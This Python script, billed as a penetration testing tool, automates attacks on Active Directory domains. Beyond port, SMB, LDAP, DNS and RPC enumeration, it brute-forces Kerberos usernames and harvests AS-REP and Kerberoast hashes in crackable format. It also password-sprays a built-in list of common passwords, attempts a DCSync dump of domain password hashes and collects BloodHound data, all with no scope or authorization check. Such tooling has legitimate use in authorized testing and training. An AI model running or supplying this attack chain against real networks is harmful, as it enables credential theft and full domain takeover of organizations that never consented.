#!/usr/bin/env python3
"""
Active Directory Enumeration Script
Author: Penetration Testing Tool
Description: Comprehensive AD enumeration using various techniques
"""

import subprocess
import sys
import os
import argparse
import json
from datetime import datetime
import threading
import time

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class ADEnumerator:
    def __init__(self, target, username=None, password=None, domain=None, output_dir="ad_enum_results"):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.output_dir = output_dir
        self.results = {}
        
        # Create output directory
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def print_banner(self):
        banner = f"""
{Colors.CYAN}
╔═══════════════════════════════════════════════════════════════╗
║                    AD ENUMERATION SCRIPT                     ║
║                   Penetration Testing Tool                   ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
Target: {Colors.YELLOW}{self.target}{Colors.END}
Domain: {Colors.YELLOW}{self.domain or 'Not specified'}{Colors.END}
Output: {Colors.YELLOW}{self.output_dir}{Colors.END}
"""
        print(banner)
    
    def run_command(self, command, description):
        """Execute command and return output"""
        print(f"{Colors.BLUE}[*]{Colors.END} {description}")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+]{Colors.END} Command executed successfully")
                return result.stdout
            else:
                print(f"{Colors.RED}[-]{Colors.END} Command failed: {result.stderr}")
                return None
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[-]{Colors.END} Command timed out")
            return None
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.END} Error: {str(e)}")
            return None
    
    def save_output(self, filename, content):
        """Save output to file"""
        if content:
            filepath = os.path.join(self.output_dir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
            print(f"{Colors.GREEN}[+]{Colors.END} Results saved to {filepath}")
    
    def nmap_scan(self):
        """Perform Nmap scan for AD services"""
        print(f"\n{Colors.BOLD}=== NMAP SCAN ==={Colors.END}")
        
        # Basic port scan for AD services
        ad_ports = "53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389"
        nmap_cmd = f"nmap -sS -sV -O -p {ad_ports} {self.target}"
        
        output = self.run_command(nmap_cmd, "Scanning AD-related ports")
        if output:
            self.results['nmap_scan'] = output
            self.save_output("nmap_scan.txt", output)
        
        # LDAP script scan
        ldap_cmd = f"nmap -p 389,636 --script ldap-rootdse,ldap-search {self.target}"
        ldap_output = self.run_command(ldap_cmd, "LDAP enumeration")
        if ldap_output:
            self.results['ldap_enum'] = ldap_output
            self.save_output("ldap_enum.txt", ldap_output)
    
    def smb_enumeration(self):
        """SMB enumeration"""
        print(f"\n{Colors.BOLD}=== SMB ENUMERATION ==={Colors.END}")
        
        # SMB version detection
        smb_cmd = f"smbclient -L //{self.target} -N"
        output = self.run_command(smb_cmd, "SMB share enumeration (anonymous)")
        if output:
            self.results['smb_shares'] = output
            self.save_output("smb_shares.txt", output)
        
        # Enum4linux
        enum4linux_cmd = f"enum4linux -a {self.target}"
        enum_output = self.run_command(enum4linux_cmd, "Running enum4linux")
        if enum_output:
            self.results['enum4linux'] = enum_output
            self.save_output("enum4linux.txt", enum_output)
        
        # SMB vulnerability scan
        smb_vuln_cmd = f"nmap -p 445 --script smb-vuln-* {self.target}"
        vuln_output = self.run_command(smb_vuln_cmd, "SMB vulnerability scan")
        if vuln_output:
            self.results['smb_vulns'] = vuln_output
            self.save_output("smb_vulns.txt", vuln_output)
    
    def ldap_enumeration(self):
        """LDAP enumeration"""
        print(f"\n{Colors.BOLD}=== LDAP ENUMERATION ==={Colors.END}")
        
        # Anonymous LDAP bind
        ldap_cmd = f"ldapsearch -x -h {self.target} -s base namingcontexts"
        output = self.run_command(ldap_cmd, "LDAP anonymous bind test")
        if output:
            self.results['ldap_anonymous'] = output
            self.save_output("ldap_anonymous.txt", output)
        
        # If credentials provided, perform authenticated enumeration
        if self.username and self.password and self.domain:
            auth_ldap_cmd = f"ldapsearch -x -h {self.target} -D '{self.domain}\\{self.username}' -w '{self.password}' -b 'DC={self.domain.replace('.', ',DC=')}' '(objectClass=*)'"
            auth_output = self.run_command(auth_ldap_cmd, "Authenticated LDAP enumeration")
            if auth_output:
                self.results['ldap_authenticated'] = auth_output
                self.save_output("ldap_authenticated.txt", auth_output)
    
    def dns_enumeration(self):
        """DNS enumeration"""
        print(f"\n{Colors.BOLD}=== DNS ENUMERATION ==={Colors.END}")
        
        if self.domain:
            # DNS zone transfer attempt
            dns_cmd = f"dig @{self.target} {self.domain} axfr"
            output = self.run_command(dns_cmd, "DNS zone transfer attempt")
            if output:
                self.results['dns_zone_transfer'] = output
                self.save_output("dns_zone_transfer.txt", output)
            
            # DNS enumeration
            dns_enum_cmd = f"dnsrecon -d {self.domain} -n {self.target}"
            dns_output = self.run_command(dns_enum_cmd, "DNS enumeration with dnsrecon")
            if dns_output:
                self.results['dns_enum'] = dns_output
                self.save_output("dns_enum.txt", dns_output)
    
    def user_enumeration(self):
        """User enumeration when no username is provided"""
        print(f"\n{Colors.BOLD}=== USER ENUMERATION ==={Colors.END}")
        
        found_users = []
        
        if self.domain:
            # Try multiple wordlists for user enumeration
            wordlists = [
                "/usr/share/seclists/Usernames/Names/names.txt",
                "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                "/usr/share/wordlists/dirb/others/names.txt"
            ]
            
            for wordlist in wordlists:
                if os.path.exists(wordlist):
                    print(f"{Colors.CYAN}[*]{Colors.END} Using wordlist: {wordlist}")
                    kerbrute_cmd = f"kerbrute userenum --dc {self.target} -d {self.domain} {wordlist} -o {self.output_dir}/found_users.txt"
                    output = self.run_command(kerbrute_cmd, f"Kerberos user enumeration with {os.path.basename(wordlist)}")
                    
                    if output:
                        self.results[f'user_enum_{os.path.basename(wordlist)}'] = output
                        self.save_output(f"user_enum_{os.path.basename(wordlist)}.txt", output)
                        
                        # Extract valid users from output
                        users = self.extract_valid_users(output)
                        found_users.extend(users)
                    break  # Use first available wordlist
            
            # Remove duplicates
            found_users = list(set(found_users))
            
            if found_users:
                print(f"{Colors.GREEN}[+]{Colors.END} Found {len(found_users)} valid users")
                users_list = "\n".join(found_users)
                self.save_output("valid_users.txt", users_list)
                
                # If multiple users found, attempt hash dumping
                if len(found_users) > 1:
                    self.attempt_hash_dumping(found_users)
            else:
                print(f"{Colors.YELLOW}[-]{Colors.END} No valid users found")
        
        return found_users
    
    def extract_valid_users(self, kerbrute_output):
        """Extract valid usernames from kerbrute output"""
        valid_users = []
        lines = kerbrute_output.split('\n')
        
        for line in lines:
            if 'VALID USERNAME:' in line:
                # Extract username from kerbrute output
                parts = line.split('VALID USERNAME:')
                if len(parts) > 1:
                    username = parts[1].strip().split('@')[0]
                    valid_users.append(username)
        
        return valid_users
    
    def attempt_hash_dumping(self, users):
        """Attempt hash dumping with found users"""
        print(f"\n{Colors.BOLD}=== HASH DUMPING ATTEMPTS ==={Colors.END}")
        print(f"{Colors.YELLOW}[!]{Colors.END} Multiple users found, attempting hash extraction...")
        
        # Try ASREPRoast for users without pre-auth
        print(f"{Colors.BLUE}[*]{Colors.END} Attempting ASREPRoast...")
        asrep_cmd = f"impacket-GetNPUsers {self.domain}/ -dc-ip {self.target} -usersfile {self.output_dir}/valid_users.txt -request -format hashcat"
        asrep_output = self.run_command(asrep_cmd, "ASREPRoast with user list")
        
        if asrep_output and '$krb5asrep$' in asrep_output:
            print(f"{Colors.GREEN}[+]{Colors.END} ASREPRoast hashes found!")
            self.results['asreproast_hashes'] = asrep_output
            self.save_output("asreproast_hashes.txt", asrep_output)
            
            # Extract and save just the hashes
            hashes = self.extract_hashes(asrep_output, '$krb5asrep$')
            if hashes:
                self.save_output("asrep_hashes_only.txt", "\n".join(hashes))
        
        # Try Kerberoasting (requires authentication)
        if self.username and self.password:
            print(f"{Colors.BLUE}[*]{Colors.END} Attempting Kerberoasting...")
            kerberoast_cmd = f"impacket-GetUserSPNs {self.domain}/{self.username}:{self.password} -dc-ip {self.target} -request -format hashcat"
            kerberoast_output = self.run_command(kerberoast_cmd, "Kerberoasting attempt")
            
            if kerberoast_output and '$krb5tgs$' in kerberoast_output:
                print(f"{Colors.GREEN}[+]{Colors.END} Kerberoast hashes found!")
                self.results['kerberoast_hashes'] = kerberoast_output
                self.save_output("kerberoast_hashes.txt", kerberoast_output)
                
                # Extract and save just the hashes
                hashes = self.extract_hashes(kerberoast_output, '$krb5tgs$')
                if hashes:
                    self.save_output("kerberoast_hashes_only.txt", "\n".join(hashes))
        
        # Try password spraying with common passwords
        self.password_spray_attack(users)
        
        # Try DCSync if we have credentials
        if self.username and self.password:
            self.attempt_dcsync()
    
    def extract_hashes(self, output, hash_type):
        """Extract hashes from tool output"""
        hashes = []
        lines = output.split('\n')
        
        for line in lines:
            if hash_type in line:
                hashes.append(line.strip())
        
        return hashes
    
    def password_spray_attack(self, users):
        """Attempt password spraying with common passwords"""
        print(f"{Colors.BLUE}[*]{Colors.END} Attempting password spraying...")
        
        common_passwords = [
            "Password123!",
            "Welcome123!",
            "Summer2024!",
            "Password1",
            "123456",
            "password",
            "admin",
            "Password!",
            "Passw0rd!",
            f"{self.domain}123!" if self.domain else "Domain123!"
        ]
        
        # Create password file
        password_file = os.path.join(self.output_dir, "common_passwords.txt")
        with open(password_file, 'w') as f:
            f.write("\n".join(common_passwords))
        
        # Create user file
        user_file = os.path.join(self.output_dir, "valid_users.txt")
        
        # Use crackmapexec for password spraying
        spray_cmd = f"nxc smb {self.target} -u {user_file} -p {password_file} --continue-on-success"
        spray_output = self.run_command(spray_cmd, "Password spraying attack")
        
        if spray_output:
            self.results['password_spray'] = spray_output
            self.save_output("password_spray.txt", spray_output)
            
            # Check for successful logins
            if '[+]' in spray_output:
                print(f"{Colors.GREEN}[+]{Colors.END} Password spray found valid credentials!")
                # Extract successful credentials
                successful_creds = self.extract_successful_creds(spray_output)
                if successful_creds:
                    self.save_output("successful_credentials.txt", "\n".join(successful_creds))
    
    def extract_successful_creds(self, spray_output):
        """Extract successful credentials from password spray output"""
        successful = []
        lines = spray_output.split('\n')
        
        for line in lines:
            if '[+]' in line and ('STATUS_SUCCESS' in line or 'Pwn3d!' in line):
                successful.append(line.strip())
        
        return successful
    
    def attempt_dcsync(self):
        """Attempt DCSync attack if we have credentials"""
        print(f"{Colors.BLUE}[*]{Colors.END} Attempting DCSync...")
        
        dcsync_cmd = f"impacket-secretsdump {self.domain}/{self.username}:{self.password}@{self.target}"
        dcsync_output = self.run_command(dcsync_cmd, "DCSync attempt")
        
        if dcsync_output:
            self.results['dcsync'] = dcsync_output
            self.save_output("dcsync_dump.txt", dcsync_output)
            
            if 'Administrator:' in dcsync_output or 'krbtgt:' in dcsync_output:
                print(f"{Colors.GREEN}[+]{Colors.END} DCSync successful! Domain hashes dumped!")
            else:
                print(f"{Colors.YELLOW}[-]{Colors.END} DCSync failed or insufficient privileges")
    
    def kerberos_enumeration(self):
        """Kerberos enumeration"""
        print(f"\n{Colors.BOLD}=== KERBEROS ENUMERATION ==={Colors.END}")
        
        # If no username provided, do user enumeration first
        if not self.username:
            found_users = self.user_enumeration()
            
            # If users found, continue with other Kerberos attacks
            if found_users:
                print(f"{Colors.GREEN}[+]{Colors.END} Proceeding with Kerberos attacks using found users")
        else:
            # If username provided, still try basic user enum for completeness
            if self.domain:
                kerbrute_cmd = f"kerbrute userenum --dc {self.target} -d {self.domain} /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                output = self.run_command(kerbrute_cmd, "Basic Kerberos user enumeration")
                if output:
                    self.results['kerberos_users'] = output
                    self.save_output("kerberos_users.txt", output)
        
        # ASREPRoast attempt (works without authentication)
        if self.domain:
            if self.username:
                asrep_cmd = f"impacket-GetNPUsers {self.domain}/{self.username} -dc-ip {self.target} -request"
            else:
                asrep_cmd = f"impacket-GetNPUsers {self.domain}/ -dc-ip {self.target} -request"
            
            asrep_output = self.run_command(asrep_cmd, "ASREPRoast attempt")
            if asrep_output:
                self.results['asreproast'] = asrep_output
                self.save_output("asreproast.txt", asrep_output)
    
    def rpc_enumeration(self):
        """RPC enumeration"""
        print(f"\n{Colors.BOLD}=== RPC ENUMERATION ==={Colors.END}")
        
        # RPC enumeration
        rpc_cmd = f"rpcclient -U '' -N {self.target}"
        # Create a script for rpcclient commands
        rpc_script = """
enumdomusers
enumdomgroups
querydominfo
getdompwinfo
quit
"""
        rpc_script_path = os.path.join(self.output_dir, "rpc_commands.txt")
        with open(rpc_script_path, 'w') as f:
            f.write(rpc_script)
        
        rpc_full_cmd = f"rpcclient -U '' -N {self.target} < {rpc_script_path}"
        output = self.run_command(rpc_full_cmd, "RPC enumeration")
        if output:
            self.results['rpc_enum'] = output
            self.save_output("rpc_enum.txt", output)
    
    def bloodhound_collection(self):
        """BloodHound data collection"""
        print(f"\n{Colors.BOLD}=== BLOODHOUND COLLECTION ==={Colors.END}")
        
        if self.username and self.password and self.domain:
            # BloodHound collection
            bh_cmd = f"bloodhound-python -u {self.username} -p '{self.password}' -d {self.domain} -ns {self.target} -c all --zip"
            output = self.run_command(bh_cmd, "BloodHound data collection")
            if output:
                self.results['bloodhound'] = output
                self.save_output("bloodhound.txt", output)
        else:
            print(f"{Colors.YELLOW}[!]{Colors.END} Credentials required for BloodHound collection")
    
    def generate_report(self):
        """Generate final report"""
        print(f"\n{Colors.BOLD}=== GENERATING REPORT ==={Colors.END}")
        
        report = f"""
Active Directory Enumeration Report
===================================
Target: {self.target}
Domain: {self.domain or 'Not specified'}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Summary of Findings:
"""
        
        for key, value in self.results.items():
            if value:
                report += f"\n{key.upper()}:\n"
                report += "=" * 50 + "\n"
                report += value[:1000] + ("..." if len(value) > 1000 else "") + "\n\n"
        
        self.save_output("full_report.txt", report)
        
        # Generate JSON report
        json_report = {
            "target": self.target,
            "domain": self.domain,
            "timestamp": datetime.now().isoformat(),
            "results": self.results
        }
        
        with open(os.path.join(self.output_dir, "report.json"), 'w') as f:
            json.dump(json_report, f, indent=2)
        
        print(f"{Colors.GREEN}[+]{Colors.END} Full report generated")
    
    def run_all(self):
        """Run all enumeration techniques"""
        self.print_banner()
        
        print(f"{Colors.YELLOW}[!]{Colors.END} Starting AD enumeration...")
        
        # Run all enumeration modules
        self.nmap_scan()
        self.smb_enumeration()
        self.ldap_enumeration()
        self.dns_enumeration()
        self.kerberos_enumeration()
        self.rpc_enumeration()
        self.bloodhound_collection()
        
        # Generate final report
        self.generate_report()
        
        print(f"\n{Colors.GREEN}[+]{Colors.END} Enumeration complete!")
        print(f"{Colors.CYAN}[*]{Colors.END} Results saved in: {self.output_dir}")

def main():
    parser = argparse.ArgumentParser(description="Active Directory Enumeration Script")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-u", "--username", help="Username for authentication")
    parser.add_argument("-p", "--password", help="Password for authentication")
    parser.add_argument("-d", "--domain", help="Domain name")
    parser.add_argument("-o", "--output", default="ad_enum_results", help="Output directory")
    
    args = parser.parse_args()
    
    # Check if required tools are installed
    required_tools = ["nmap", "smbclient", "enum4linux", "ldapsearch", "dig", "rpcclient"]
    missing_tools = []
    
    for tool in required_tools:
        if subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"{Colors.RED}[-]{Colors.END} Missing required tools: {', '.join(missing_tools)}")
        print(f"{Colors.YELLOW}[!]{Colors.END} Please install missing tools before running")
        sys.exit(1)
    
    # Initialize and run enumeration
    enumerator = ADEnumerator(
        target=args.target,
        username=args.username,
        password=args.password,
        domain=args.domain,
        output_dir=args.output
    )
    
    try:
        enumerator.run_all()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[-]{Colors.END} Enumeration interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[-]{Colors.END} Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
